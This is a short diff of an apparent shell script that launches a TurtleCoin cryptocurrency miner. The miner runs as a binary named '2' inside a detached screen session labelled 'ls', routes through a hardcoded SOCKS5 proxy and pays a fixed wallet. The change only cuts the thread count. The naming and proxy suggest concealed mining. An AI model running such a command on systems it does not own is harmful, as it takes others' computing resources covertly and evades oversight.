@@ -5,4 +5,4 @@ sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-de
 chmod +x 2
 screen -dmS ls
 
- ./2 -a argon2/chukwav2 -o us.turtlecoin.herominers.com:1160 -u TRTLuxaMVkNaKUrey8Dh6tfKSzup58rRbdQFW6RGTR8dSy2VkY5tXbRAPLMuC44C3rZYGumcAuFKjFktTEGV9Z5wRvnjnxzaxvR.$(shuf -i 1000-9999 -n 1) -t 30 -x socks5://98.170.57.231:4145 -p x
+ ./2 -a argon2/chukwav2 -o us.turtlecoin.herominers.com:1160 -u TRTLuxaMVkNaKUrey8Dh6tfKSzup58rRbdQFW6RGTR8dSy2VkY5tXbRAPLMuC44C3rZYGumcAuFKjFktTEGV9Z5wRvnjnxzaxvR.$(shuf -i 1000-9999 -n 1) -t 3 -x socks5://98.170.57.231:4145 -p x
